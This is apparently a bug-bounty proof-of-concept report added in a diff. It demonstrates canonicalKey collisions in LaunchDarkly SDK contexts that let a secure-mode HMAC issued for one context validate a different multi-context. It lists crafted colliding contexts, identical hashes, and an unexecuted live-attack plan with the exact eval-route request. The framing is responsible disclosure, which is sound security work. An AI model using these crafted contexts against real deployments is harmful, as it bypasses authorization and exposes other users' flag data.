@@ -1,0 +1,93 @@
+# canonicalKey collision PoC
+node-server-sdk: /home/user/Launch-Darkly-Bug-Bounty/sdk/node-server-sdk/context.js
+js-core transcription: packages/shared/common/src/Context.ts (encodeKey + canonicalKey getter)
+
+## 1. Headline collision
+A = {"kind":"user","key":"org:o1:user:u1"}
+B = {"kind":"multi","org":{"key":"o1"},"user":{"key":"u1"}}
+
+node-server-sdk getCanonicalKey:
+  canonicalKey(A) = "org:o1:user:u1"
+  canonicalKey(B) = "org:o1:user:u1"
+  COLLISION: true
+
+js-core canonicalKey (transcribed):
+  canonicalKey(A) = "org:o1:user:u1"
+  canonicalKey(B) = "org:o1:user:u1"
+  COLLISION: true
+
+## 2. Secure-mode consequence (HMAC-SHA256(sdkKey, canonicalKey))
+dummy sdk key: sdk-00000000-0000-0000-0000-000000000000
+  h(A) = 5c78996b75c6cf4d743499ca21c06cbd6db9b39828fb4ccf20a263d6812c03b9
+  h(B) = 5c78996b75c6cf4d743499ca21c06cbd6db9b39828fb4ccf20a263d6812c03b9
+  IDENTICAL HASH FOR TWO DIFFERENT CONTEXTS: true
+  → a hash issued by the customer backend for context A is accepted for context B.
+
+## 3. Systematic collision search (kinds/keys that a normal app could produce)
+  contexts generated: 5880 (56 single, 3136 crafted-user, 2688 multi)
+  distinct canonicalKeys: 3192
+  COLLIDING pairs found: 2688
+
+  first collisions (canonicalKey ← two different contexts):
+    "org:u1:user:u1"
+      ← {"kind":"user","key":"org:u1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"u1"}}
+    "org:o1:user:u1"
+      ← {"kind":"user","key":"org:o1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"o1"}}
+    "org:d1:user:u1"
+      ← {"kind":"user","key":"org:d1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"d1"}}
+    "org:s1:user:u1"
+      ← {"kind":"user","key":"org:s1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"s1"}}
+    "org:alice:user:u1"
+      ← {"kind":"user","key":"org:alice:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"alice"}}
+    "org:acme:user:u1"
+      ← {"kind":"user","key":"org:acme:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"acme"}}
+    "org:user:user:u1"
+      ← {"kind":"user","key":"org:user:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"user"}}
+    "org:org:user:u1"
+      ← {"kind":"user","key":"org:org:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"org":{"key":"org"}}
+    "organization:u1:user:u1"
+      ← {"kind":"user","key":"organization:u1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"organization":{"key":"u1"}}
+    "organization:o1:user:u1"
+      ← {"kind":"user","key":"organization:o1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"organization":{"key":"o1"}}
+    "organization:d1:user:u1"
+      ← {"kind":"user","key":"organization:d1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"organization":{"key":"d1"}}
+    "organization:s1:user:u1"
+      ← {"kind":"user","key":"organization:s1:user:u1"}
+      ← {"kind":"multi","user":{"key":"u1"},"organization":{"key":"s1"}}
+
+## 4. Cross-implementation agreement
+  disagreements: 0 / 5880
+  (agreement means this is a shared SPEC-level flaw, not one SDK typo: the same collision
+   exists in every SDK that follows the canonicalKey spec, and therefore on the server,
+   which must compute the same value to verify the `h` parameter.)
+
+## 5. Secondary asymmetry — KIND names are never encoded
+C = {"kind":"a:b:c","key":"d"}
+D = {"kind":"multi","a":{"key":"b"},"c":{"key":"d"}}
+  node-server-sdk: canonicalKey(C)="a:b:c:d"  canonicalKey(D)="a:b:c:d"
+  COLLISION: true
+  (exploitable only if the service accepts context kinds containing ":" — context-kind
+   naming rules are enforced server-side, so this vector needs live confirmation; the
+   user-key vector in §1 needs no unusual kind names at all.)
+
+## 6. Live confirmation plan (not executed by this script)
+  Requires an environment with secure mode ON and a backend that signs a context key the
+  attacker can influence (username, tenant slug, device id, session id, etc.):
+   1. backend signs A = {kind:"user", key:"org:<victimOrg>:user:<victimUser>"}  → h
+   2. attacker calls the client-side eval route with B = {kind:"multi",
+      org:{key:"<victimOrg>"}, user:{key:"<victimUser>"}} and h from step 1:
+        GET https://app.launchdarkly.com/sdk/evalx/{clientSideId}/contexts/{b64url(B)}?h={h}&withReasons=true
+   3. expected (secure): 4xx invalid hash.  observed if vulnerable: 200 + B's flag values,
+      i.e. the victim multi-context was evaluated using a hash issued for a different context.
+  Only our own tenants/environments are used; stop at proof and report.
